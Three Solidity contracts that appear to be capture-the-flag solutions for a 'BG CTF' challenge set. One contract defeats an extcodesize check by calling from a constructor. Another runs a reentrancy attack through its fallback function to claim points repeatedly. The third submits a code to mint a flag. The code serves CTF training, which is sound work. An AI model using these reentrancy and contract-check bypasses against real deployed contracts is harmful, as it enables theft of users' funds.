contracts/Challenge3Helper.sol.content:
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge3 {
    function mintFlag() external;
}

contract Challenge3Helper {
    constructor(address challenge) {
        // call from constructor so extcodesize(caller()) == 0 in Challenge3
        IChallenge3(challenge).mintFlag();
    }
}

contracts/Challenge5Solution.sol.content:
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge5 {
    function claimPoints() external;
    function mintFlag() external;
}

contract Challenge5Solution {
    address public target;
    bool private inClaim;
    uint256 public remaining;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        require(!inClaim, "busy");
        inClaim = true;
        remaining = 10;
        IChallenge5(target).claimPoints();
        inClaim = false;
        IChallenge5(target).mintFlag();
    }

    fallback() external payable {
        // reenter until remaining points reached
        if (inClaim && remaining > 1) {
            remaining -= 1;
            IChallenge5(target).claimPoints();
        }
    }

    receive() external payable {}
}

contracts/Challenge6Solution.sol.content:
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge6 {
    function mintFlag(uint256 code) external;
}

contract Challenge6Solution {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function name() external pure returns (string memory) {
        return "BG CTF Challenge 6 Solution";
    }

    function solve(uint256 code) external {
        // Best-effort: just call; in practice you might wrap to shape gas, but leave tx-level control to caller
        IChallenge6(target).mintFlag(code);
    }
}
